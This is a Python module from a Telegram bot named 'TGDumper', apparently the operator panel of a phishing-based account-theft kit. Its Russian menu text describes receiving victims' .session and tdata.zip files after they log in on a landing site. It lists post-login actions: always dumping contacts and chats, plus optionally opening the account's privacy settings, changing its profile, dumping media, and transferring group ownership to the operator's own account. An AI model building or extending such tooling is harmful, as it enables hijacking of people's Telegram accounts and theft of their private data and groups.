from __future__ import annotations

from aiogram.exceptions import TelegramBadRequest
from aiogram.types import CallbackQuery

from bot.keyboards import BOOL_FIELDS, TEXT_FIELDS
from web.services.migration.settings import settings_repo

FIELD_TITLES = {key: title for key, title in TEXT_FIELDS + BOOL_FIELDS}
FIELD_BACK = {key: "menu:account" for key, _ in TEXT_FIELDS}


async def format_settings() -> str:
	from web.services.migration.target_joiner_ipc import ipc_store

	s = await settings_repo.load()
	joiner = ipc_store.status_label()
	alive = "да" if ipc_store.is_joiner_alive() else "нет"
	lines = [
		"<b>👤 Управление аккаунтом</b>",
		"",
		f"• Username: <code>{s.target_username or '—'}</code>",
		f"• Bio: <code>{s.bio or '—'}</code>",
		f"• Целевой аккаунт: <code>{s.target_account or '—'}</code>",
		f"• Инвайт-аккаунт: <code>{joiner}</code> (скрипт: {alive})",
		f"• Группа: <code>{s.notify_group_link or '—'}</code>",
		f"• Сообщение: <code>{s.notify_message or '—'}</code>",
		f"• Прокси: <code>{s.default_proxy or '—'}</code>",
		f"• Chat ID логов: <code>{s.bot_chat_id or '—'}</code>",
		"",
		"<b>После входа:</b>",
		"• Контакты (чаты/каналы): ✅ всегда",
		f"• Сообщение в группу: {'✅' if s.notify_group else '⬜️'}",
		f"• Приватность: {'✅' if s.open_privacy else '⬜️'}",
		f"• Профиль: {'✅' if s.change_profile else '⬜️'}",
		f"• Дампер фото/видео: {'✅' if s.export_media else '⬜️'}",
		f"• Перенос групп: {'✅' if s.migrate_groups else '⬜️'}",
	]
	return "\n".join(lines)


def steps_menu_text() -> str:
	return (
		"<b>⚙️ Что делать после входа</b>\n\n"
		"<b>✅ Контакты</b> — всегда\n"
		"выкачиваются контакты, чаты/каналы\n\n"
		"<b>По желанию</b> (нажмите, чтобы вкл/выкл):\n\n"
		"<b>Сообщение в группу</b>\n"
		"аккаунт оставляет сообщение в ваш чат\n\n"
		"<b>Приватность</b>\n"
		"конфиденциальность аккаунта открывается полностью\n\n"
		"<b>Профиль</b>\n"
		"меняется bio, username и т.д.\n\n"
		"<b>Дампер фото/видео</b>\n\n"
		"<b>Перенос групп</b>\n"
		"аккаунт добавляет ваш второй акк, отдаёт админа и выходит"
	)


def actions_menu_text() -> str:
	return (
		"<b>🛠 Служебное</b>\n\n"
		"• <b>Показать настройки</b> — текущий конфиг\n"
		"• <b>Собрать tdata</b> — из уже лежащих .session "
		"(для Desktop; после веб-входа tdata обычно уже в логах)\n"
		"• <b>Заново: сообщение + перенос групп</b> — сброс только этих шагов"
	)


async def root_text() -> str:
	s = await settings_repo.load()
	return (
		"<b>TGDumper</b>\n"
		"Выберите раздел.\n\n"
		"🌐 <b>Сайт</b> — контент лендинга (аватар, фото, соцсети)\n"
		"👤 <b>Управление аккаунтом</b> — миграция, целевой аккаунт, логи\n\n"
		f"Логи → chat_id: <code>{s.bot_chat_id or '—'}</code>\n"
		"<i>После входа на сайт сюда приходят .session и tdata.zip</i>"
	)


async def account_text() -> str:
	return await format_settings()


async def network_text(extra: str = "") -> str:
	text = await format_settings()
	if extra:
		text += f"\n{extra}"
	return text


async def edit_menu(callback: CallbackQuery, text: str, markup) -> None:
	try:
		await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
	except TelegramBadRequest as error:
		if "message is not modified" not in str(error):
			raise
	await callback.answer()
